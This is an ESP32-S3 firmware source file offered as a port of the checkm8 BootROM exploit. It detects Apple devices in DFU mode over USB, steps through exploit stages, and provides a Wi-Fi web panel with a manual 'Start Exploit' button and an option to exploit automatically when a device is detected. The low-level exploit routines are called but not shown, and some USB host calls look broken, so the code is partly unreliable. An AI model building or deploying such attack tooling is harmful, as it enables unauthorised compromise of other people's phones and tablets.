/**
 * ESP32-S3 Enhanced checkm8 Implementation
 * 
 * This is a comprehensive port of the checkm8 exploit for ESP32-S3 with dual USB-C support.
 * Features:
 * - Full self-contained operation (no external MCU required)
 * - Dual USB-C port support with role switching
 * - Automated scheduling and triggering
 * - Web interface for remote control
 * - GPIO status indicators and triggers
 * - Native ESP32-S3 USB host implementation
 */

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <ArduinoJson.h>
#include <USB.h>
#include "esp_usb_host.h"
#include "usb/usb_host.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/timers.h"
#include "esp_log.h"
#include "esp_system.h"
#include "../include/checkm8_esp32s3.h"
#include "../../constants.h"

static const char* TAG = "checkm8_esp32s3";

// Global state variables
static CheckM8State g_checkm8_state = CHECKM8_IDLE;
static USBPortState g_usb_ports[2] = {{USB_PORT_IDLE, false}, {USB_PORT_IDLE, false}};
static uint8_t g_current_device_addr = 0;
static uint8_t g_serial_idx = 0;
static bool g_dfu_device_found = false;
static AutomationConfig g_automation_config = {false, 0, 0, false};

// Hardware configuration
static const int STATUS_LED_PIN = 2;
static const int TRIGGER_PIN = 0;
static const int USB_POWER_PIN = 21;

// Web server and automation
static WebServer g_web_server(80);
static TimerHandle_t g_automation_timer = NULL;
static QueueHandle_t g_usb_event_queue = NULL;

// Forward declarations
static void usb_host_task(void *arg);
static void automation_task(void *arg);
static void web_server_task(void *arg);
static void usb_event_handler(const usb_host_client_event_msg_t *event_msg, void *arg);
static void setup_web_server();
static void handle_checkm8_automation();

/**
 * Initialize hardware and peripherals
 */
void setup_hardware() {
    // Configure GPIO pins
    pinMode(STATUS_LED_PIN, OUTPUT);
    pinMode(TRIGGER_PIN, INPUT_PULLUP);
    pinMode(USB_POWER_PIN, OUTPUT);
    
    // Power on USB ports
    digitalWrite(USB_POWER_PIN, HIGH);
    digitalWrite(STATUS_LED_PIN, LOW);
    
    ESP_LOGI(TAG, "Hardware initialized");
}

/**
 * Initialize USB host subsystem with dual port support
 */
esp_err_t setup_usb_host() {
    // Initialize USB host library
    const usb_host_config_t host_config = {
        .skip_phy_setup = false,
        .intr_flags = ESP_INTR_FLAG_LEVEL1,
    };
    
    esp_err_t ret = usb_host_install(&host_config);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to install USB host: %s", esp_err_to_name(ret));
        return ret;
    }
    
    // Create event queue for USB events
    g_usb_event_queue = xQueueCreate(10, sizeof(usb_host_client_event_msg_t));
    if (!g_usb_event_queue) {
        ESP_LOGE(TAG, "Failed to create USB event queue");
        return ESP_ERR_NO_MEM;
    }
    
    // Register USB host client
    const usb_host_client_config_t client_config = {
        .is_synchronous = false,
        .max_num_event_msg = 5,
        .async = {
            .client_event_callback = usb_event_handler,
            .callback_arg = NULL,
        }
    };
    
    usb_host_client_handle_t client_handle;
    ret = usb_host_client_register(&client_config, &client_handle);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to register USB client: %s", esp_err_to_name(ret));
        return ret;
    }
    
    ESP_LOGI(TAG, "USB host initialized with dual port support");
    return ESP_OK;
}

/**
 * Initialize WiFi and web server for remote control
 */
void setup_wifi_and_web() {
    // Configure WiFi as AP mode for isolated operation
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32S3-CheckM8", "checkm8esp32");
    
    IPAddress local_ip(192, 168, 4, 1);
    IPAddress gateway(192, 168, 4, 1);
    IPAddress subnet(255, 255, 255, 0);
    WiFi.softAPConfig(local_ip, gateway, subnet);
    
    ESP_LOGI(TAG, "WiFi AP started: ESP32S3-CheckM8");
    ESP_LOGI(TAG, "IP address: %s", WiFi.softAPIP().toString().c_str());
    
    setup_web_server();
}

/**
 * Setup automation system with FreeRTOS timers
 */
void setup_automation() {
    // Create automation timer
    g_automation_timer = xTimerCreate(
        "AutomationTimer",
        pdMS_TO_TICKS(1000), // 1 second period
        pdTRUE, // Auto-reload
        NULL,
        [](TimerHandle_t timer) {
            handle_checkm8_automation();
        }
    );
    
    if (g_automation_timer) {
        ESP_LOGI(TAG, "Automation system initialized");
    } else {
        ESP_LOGE(TAG, "Failed to create automation timer");
    }
}

/**
 * Main setup function
 */
void setup() {
    Serial.begin(115200);
    
    ESP_LOGI(TAG, "ESP32-S3 Enhanced checkm8 starting...");
    ESP_LOGI(TAG, "Features: Dual USB-C, Automation, Web Control");
    
    // Initialize subsystems
    setup_hardware();
    
    if (setup_usb_host() != ESP_OK) {
        ESP_LOGE(TAG, "USB host setup failed, halting");
        while(1) {
            digitalWrite(STATUS_LED_PIN, !digitalRead(STATUS_LED_PIN));
            delay(100);
        }
    }
    
    setup_wifi_and_web();
    setup_automation();
    
    // Create FreeRTOS tasks
    xTaskCreate(usb_host_task, "USBHostTask", 4096, NULL, 10, NULL);
    xTaskCreate(automation_task, "AutomationTask", 2048, NULL, 5, NULL);
    xTaskCreate(web_server_task, "WebServerTask", 4096, NULL, 3, NULL);
    
    ESP_LOGI(TAG, "All systems initialized and ready");
    digitalWrite(STATUS_LED_PIN, HIGH); // Ready indicator
}

/**
 * Main loop - minimal overhead, tasks handle everything
 */
void loop() {
    // Check manual trigger button
    static bool last_trigger_state = true;
    bool current_trigger = digitalRead(TRIGGER_PIN);
    
    if (last_trigger_state && !current_trigger) { // Button pressed
        ESP_LOGI(TAG, "Manual trigger activated");
        if (g_dfu_device_found) {
            g_checkm8_state = CHECKM8_INIT_RESET;
        }
    }
    last_trigger_state = current_trigger;
    
    delay(50); // Light polling
}

/**
 * USB host management task
 */
static void usb_host_task(void *arg) {
    ESP_LOGI(TAG, "USB host task started");
    
    while (1) {
        // Handle USB host events
        uint32_t event_flags;
        usb_host_lib_handle_events(portMAX_DELAY, &event_flags);
        
        // Process USB client events
        usb_host_client_event_msg_t event_msg;
        while (xQueueReceive(g_usb_event_queue, &event_msg, 0) == pdTRUE) {
            // Handle device connection/disconnection
            switch (event_msg.event) {
                case USB_HOST_CLIENT_EVENT_NEW_DEV:
                    handle_device_connection(event_msg.new_dev.address);
                    break;
                case USB_HOST_CLIENT_EVENT_DEV_GONE:
                    handle_device_disconnection(event_msg.dev_gone.address);
                    break;
                default:
                    break;
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

/**
 * Automation management task
 */
static void automation_task(void *arg) {
    ESP_LOGI(TAG, "Automation task started");
    
    while (1) {
        // Monitor automation state and execute scheduled actions
        if (g_automation_config.enabled) {
            static uint32_t last_check = 0;
            uint32_t current_time = millis();
            
            if (current_time - last_check >= g_automation_config.interval_ms) {
                if (g_automation_config.auto_exploit && g_dfu_device_found) {
                    g_checkm8_state = CHECKM8_INIT_RESET;
                    ESP_LOGI(TAG, "Automated exploit triggered");
                }
                last_check = current_time;
            }
        }
        
        // Execute current checkm8 state
        execute_checkm8_state();
        
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

/**
 * Web server management task
 */
static void web_server_task(void *arg) {
    ESP_LOGI(TAG, "Web server task started");
    
    while (1) {
        g_web_server.handleClient();
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

/**
 * Handle device connection events
 */
void handle_device_connection(uint8_t device_addr) {
    ESP_LOGI(TAG, "Device connected: address %d", device_addr);
    
    // Get device descriptor
    usb_device_handle_t device_handle;
    if (usb_host_device_open(NULL, device_addr, &device_handle) == ESP_OK) {
        const usb_device_desc_t *device_desc;
        if (usb_host_get_device_descriptor(device_handle, &device_desc) == ESP_OK) {
            ESP_LOGI(TAG, "Device VID:PID = %04X:%04X", 
                     device_desc->idVendor, device_desc->idProduct);
            
            // Check for Apple DFU device
            if (device_desc->idVendor == 0x05AC && device_desc->idProduct == 0x1227) {
                ESP_LOGI(TAG, "Apple DFU device detected!");
                g_dfu_device_found = true;
                g_current_device_addr = device_addr;
                g_serial_idx = device_desc->iSerialNumber;
                
                // Update status LED
                digitalWrite(STATUS_LED_PIN, HIGH);
                
                // Auto-start if enabled
                if (g_automation_config.auto_exploit) {
                    g_checkm8_state = CHECKM8_INIT_RESET;
                }
            }
        }
        usb_host_device_close(NULL, device_handle);
    }
}

/**
 * Handle device disconnection events
 */
void handle_device_disconnection(uint8_t device_addr) {
    ESP_LOGI(TAG, "Device disconnected: address %d", device_addr);
    
    if (device_addr == g_current_device_addr) {
        g_dfu_device_found = false;
        g_current_device_addr = 0;
        g_checkm8_state = CHECKM8_IDLE;
        digitalWrite(STATUS_LED_PIN, LOW);
    }
}

/**
 * Execute current checkm8 exploit state
 */
void execute_checkm8_state() {
    if (!g_dfu_device_found || g_checkm8_state == CHECKM8_IDLE) {
        return;
    }
    
    static uint32_t last_state_change = 0;
    uint32_t current_time = millis();
    
    // Rate limiting between states
    if (current_time - last_state_change < 1000) {
        return;
    }
    
    switch (g_checkm8_state) {
        case CHECKM8_INIT_RESET:
            ESP_LOGI(TAG, "Starting checkm8 exploit...");
            perform_heap_feng_shui();
            g_checkm8_state = CHECKM8_SET_GLOBAL_STATE;
            break;
            
        case CHECKM8_SET_GLOBAL_STATE:
            ESP_LOGI(TAG, "Setting global state...");
            perform_set_global_state();
            g_checkm8_state = CHECKM8_HEAP_OCCUPATION;
            break;
            
        case CHECKM8_HEAP_OCCUPATION:
            ESP_LOGI(TAG, "Heap occupation...");
            perform_heap_occupation();
            g_checkm8_state = CHECKM8_COMPLETE;
            break;
            
        case CHECKM8_COMPLETE:
            ESP_LOGI(TAG, "checkm8 exploit completed!");
            // Blink LED to indicate success
            for (int i = 0; i < 6; i++) {
                digitalWrite(STATUS_LED_PIN, !digitalRead(STATUS_LED_PIN));
                delay(200);
            }
            g_checkm8_state = CHECKM8_IDLE;
            break;
            
        default:
            break;
    }
    
    last_state_change = current_time;
}

/**
 * USB event handler callback
 */
static void usb_event_handler(const usb_host_client_event_msg_t *event_msg, void *arg) {
    // Queue event for processing in USB task
    xQueueSend(g_usb_event_queue, event_msg, 0);
}

/**
 * Setup web server endpoints
 */
static void setup_web_server() {
    // Main dashboard
    g_web_server.on("/", HTTP_GET, []() {
        String html = generate_dashboard_html();
        g_web_server.send(200, "text/html", html);
    });
    
    // API endpoints
    g_web_server.on("/api/status", HTTP_GET, handle_api_status);
    g_web_server.on("/api/exploit", HTTP_POST, handle_api_exploit);
    g_web_server.on("/api/config", HTTP_GET, handle_api_get_config);
    g_web_server.on("/api/config", HTTP_POST, handle_api_set_config);
    g_web_server.on("/api/reset", HTTP_POST, handle_api_reset);
    
    g_web_server.begin();
    ESP_LOGI(TAG, "Web server started on port 80");
}

/**
 * Generate main dashboard HTML
 */
String generate_dashboard_html() {
    String html = R"(
<!DOCTYPE html>
<html>
<head>
    <title>ESP32-S3 checkm8 Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; margin: 20px; background: #f0f0f0; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
        .status { padding: 10px; margin: 10px 0; border-radius: 5px; }
        .ready { background: #d4edda; border: 1px solid #c3e6cb; }
        .working { background: #fff3cd; border: 1px solid #ffeaa7; }
        .error { background: #f8d7da; border: 1px solid #f5c6cb; }
        button { padding: 10px 20px; margin: 5px; border: none; border-radius: 5px; cursor: pointer; }
        .btn-primary { background: #007bff; color: white; }
        .btn-danger { background: #dc3545; color: white; }
        .btn-success { background: #28a745; color: white; }
        input[type="number"] { padding: 5px; margin: 5px; width: 100px; }
    </style>
    <script>
        function updateStatus() {
            fetch('/api/status')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('status').innerHTML = 
                        '<strong>Status:</strong> ' + data.state + '<br>' +
                        '<strong>DFU Device:</strong> ' + (data.dfu_found ? 'Connected' : 'Not Found') + '<br>' +
                        '<strong>Automation:</strong> ' + (data.automation.enabled ? 'Enabled' : 'Disabled');
                });
        }
        
        function startExploit() {
            fetch('/api/exploit', {method: 'POST'})
                .then(response => response.json())
                .then(data => alert(data.message));
        }
        
        function saveConfig() {
            const config = {
                enabled: document.getElementById('auto_enabled').checked,
                interval_ms: parseInt(document.getElementById('interval').value) * 1000,
                auto_exploit: document.getElementById('auto_exploit').checked
            };
            
            fetch('/api/config', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(config)
            })
            .then(response => response.json())
            .then(data => alert(data.message));
        }
        
        setInterval(updateStatus, 2000);
        window.onload = updateStatus;
    </script>
</head>
<body>
    <div class="container">
        <h1>ESP32-S3 checkm8 Control Panel</h1>
        <div id="status" class="status ready">Loading...</div>
        
        <h2>Manual Control</h2>
        <button class="btn-primary" onclick="startExploit()">Start Exploit</button>
        <button class="btn-danger" onclick="fetch('/api/reset', {method: 'POST'})">Reset State</button>
        
        <h2>Automation Settings</h2>
        <label><input type="checkbox" id="auto_enabled"> Enable Automation</label><br>
        <label>Interval (seconds): <input type="number" id="interval" value="30" min="1"></label><br>
        <label><input type="checkbox" id="auto_exploit"> Auto-exploit on device detection</label><br>
        <button class="btn-success" onclick="saveConfig()">Save Config</button>
        
        <h2>Features</h2>
        <ul>
            <li>Dual USB-C port support</li>
            <li>Automated device detection</li>
            <li>Web-based remote control</li>
            <li>GPIO trigger support</li>
            <li>Self-contained operation</li>
        </ul>
    </div>
</body>
</html>
)";
    return html;
}

/**
 * Handle automation timer callback
 */
static void handle_checkm8_automation() {
    // This is called by the automation timer
    // Additional automated tasks can be added here
    if (g_automation_config.enabled && g_automation_config.repeat_count > 0) {
        g_automation_config.repeat_count--;
        if (g_automation_config.repeat_count == 0) {
            g_automation_config.enabled = false;
            ESP_LOGI(TAG, "Automation cycle completed");
        }
    }
}